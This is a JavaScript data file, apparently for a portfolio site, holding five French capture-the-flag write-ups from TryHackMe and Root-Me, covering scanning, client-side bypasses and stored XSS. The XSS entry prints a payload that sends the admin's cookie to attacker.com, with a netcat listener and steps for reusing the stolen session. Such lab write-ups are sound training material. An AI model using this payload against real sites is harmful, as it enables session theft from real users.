import { Server, Terminal, Shield, Code, Lock } from 'lucide-react';

export const writeups = [
    {
        id: 'c1',
        title: 'Basic Pentesting - TryHackMe',
        platform: 'TryHackMe',
        difficulty: 'Easy',
        date: '2024-01-15',
        readTime: '10 min',
        tags: ['Web', 'BruteForce', 'Privesc'],
        icon: Server,
        summary: 'Un writeup complet de la room Basic Pentesting sur TryHackMe. Cette machine permet de pratiquer le hacking d\'applications web et l\'escalade de privilèges.',
        content: `
# Basic Pentesting - TryHackMe Writeup

## Introduction
Cette room est parfaite pour débuter en pentesting. Elle couvre plusieurs concepts essentiels.

## Reconnaissance

### Scan Nmap
\`\`\`bash
nmap -sV -sC -oN nmap.txt 10.10.x.x
\`\`\`

Ports ouverts découverts :
- Port 22 (SSH)
- Port 80 (HTTP)
- Port 139/445 (SMB)

## Énumération Web

### Découverte de répertoires
\`\`\`bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt
\`\`\`

## Exploitation

### Accès initial
Utilisation de credentials par défaut trouvés...

## Escalade de privilèges
Exploitation d'une mauvaise configuration SUID...

## Flags
- User flag: THM{...}
- Root flag: THM{...}

## Conclusion
Une excellente machine pour pratiquer les bases du pentesting.
    `,
        link: 'https://tryhackme.com/room/basicpentestingjt'
    },
    {
        id: 'wu2',
        title: 'Offensive Security Intro',
        platform: 'TryHackMe',
        difficulty: 'Very Easy',
        date: '2024-02-10',
        readTime: '5 min',
        tags: ['Web', 'Auth', 'Intro'],
        icon: Terminal,
        summary: 'Introduction à la sécurité offensive. Premier hack d\'un site web dans un environnement sécurisé.',
        content: `
# Offensive Security Intro Writeup

## Introduction
Ma première expérience en ethical hacking avec TryHackMe.

## Objectif
Hacker un faux site bancaire pour comprendre les bases.

## Méthodologie

### 1. Reconnaissance
Analyse du site web cible...

### 2. Exploitation
Utilisation d'un outil de brute force...

### 3. Accès obtenu
Connexion réussie au compte admin...

## Leçons apprises
- Importance de mots de passe forts
- Bases de l'authentification web
- Méthodologie de test de pénétration

## Conclusion
Une excellente introduction au monde du hacking éthique !
    `,
        link: 'https://tryhackme.com/room/offensivesecurityintro'
    },
    {
        id: 'wu3',
        title: 'HTML - Boutons désactivés',
        platform: 'Root-Me',
        difficulty: 'Very Easy',
        date: '2024-03-05',
        readTime: '3 min',
        tags: ['Web', 'HTML', 'Client-Side'],
        icon: Code,
        summary: 'Challenge sur la manipulation HTML côté client. Apprendre à contourner les restrictions JavaScript.',
        content: `
# HTML - Boutons désactivés - Root-Me

## Challenge
Un formulaire est désactivé. Comment l'utiliser quand même ?

## Solution

### Inspection du code
En ouvrant les DevTools (F12), on voit :
\`\`\`html
<input type="submit" disabled>
\`\`\`

### Manipulation
Plusieurs méthodes possibles :

#### Méthode 1 : DevTools
1. Clic droit sur le bouton
2. "Inspecter l'élément"
3. Supprimer l'attribut \`disabled\`

#### Méthode 2 : Console JavaScript
\`\`\`javascript
document.querySelector('input[type="submit"]').disabled = false;
\`\`\`

#### Méthode 3 : Interception de la requête
Utiliser Burp Suite pour intercepter et modifier la requête...

## Validation obtenue !

## Leçon
Ne jamais faire confiance aux validations côté client !
    `,
        link: 'https://www.root-me.org/fr/Challenges/Web-Client/HTML-boutons-desactives'
    },
    {
        id: 'wu4',
        title: 'Javascript - Authentification',
        platform: 'Root-Me',
        difficulty: 'Very Easy',
        date: '2024-03-12',
        readTime: '4 min',
        tags: ['Web', 'JavaScript', 'Auth'],
        icon: Lock,
        summary: 'Analyse d\'un système d\'authentification JavaScript. Comprendre pourquoi l\'authentification côté client est dangereuse.',
        content: `
# Javascript - Authentification - Root-Me

## Contexte
Page web avec authentification JavaScript. Le mot de passe est-il vraiment sécurisé ?

## Analyse

### Code source
En inspectant la page (Ctrl+U), on trouve :
\`\`\`javascript
function verify() {
  if (document.getElementById('password').value == 'mot_de_passe_secret') {
    alert('Accès autorisé !');
  }
}
\`\`\`

### Problème
Le mot de passe est hardcodé en clair dans le JavaScript !

## Exploitation

### Méthode 1 : Lecture directe
Simplement lire le code source...

### Méthode 2 : Console
\`\`\`javascript
verify.toString()
\`\`\`

## Flag récupéré
Mot de passe trouvé et challenge validé.

## Pourquoi c'est dangereux ?
- Code JavaScript = visible par tous
- Aucune vraie sécurité
- L'authentification doit TOUJOURS être côté serveur

## Bonnes pratiques
✅ Authentification serveur
✅ Hashing des mots de passe
✅ HTTPS obligatoire
❌ Jamais de secrets dans le JavaScript
    `,
        link: 'https://www.root-me.org/fr/Challenges/Web-Client/Javascript-Authentification'
    },
    {
        id: 'wu5',
        title: 'XSS - Stockée 1',
        platform: 'Root-Me',
        difficulty: 'Easy',
        date: '2024-04-01',
        readTime: '8 min',
        tags: ['Web', 'XSS', 'Injection'],
        icon: Shield,
        summary: 'Premier challenge XSS. Voler le cookie de session de l\'administrateur via une injection XSS stockée.',
        content: `
# XSS - Stockée 1 - Root-Me

## Qu'est-ce qu'une XSS ?
Cross-Site Scripting = injection de code JavaScript malveillant.

## Objectif
Voler le cookie de session de l'admin.

## Reconnaissance

### Test basique
\`\`\`html
<script>alert(1)</script>
\`\`\`
✅ Fonctionne ! Le site est vulnérable.

## Exploitation

### Payload pour voler le cookie
\`\`\`html
<script>
document.location='http://attacker.com/?cookie='+document.cookie;
</script>
\`\`\`

### Configuration du listener
\`\`\`bash
nc -lvp 8000
\`\`\`

### Attente de la victime
L'admin visite la page... et son cookie est capturé !

## Utilisation du cookie

### Modification du cookie
1. Ouvrir DevTools (F12)
2. Aller dans "Application" > "Cookies"
3. Remplacer notre cookie par celui de l'admin

### Validation
Flag récupéré avec les privilèges admin !

## Mitigation
- Validation et sanitization des entrées
- Content Security Policy (CSP)
- HttpOnly flag sur les cookies sensibles
- Échappement des caractères spéciaux

## Impact réel
Les XSS permettent :
- Vol de sessions
- Défacement de site
- Phishing
- Redirection malveillante
    `,
        link: 'https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-1'
    }
];

// Fonction utilitaire pour obtenir un writeup par ID
export const getWriteupById = (id) => {
    return writeups.find(wu => wu.id === id);
};

// Fonction pour obtenir les writeups par plateforme
export const getWriteupsByPlatform = (platform) => {
    return writeups.filter(wu => wu.platform === platform);
};

// Fonction pour obtenir les writeups par difficulté
export const getWriteupsByDifficulty = (difficulty) => {
    return writeups.filter(wu => wu.difficulty === difficulty);
};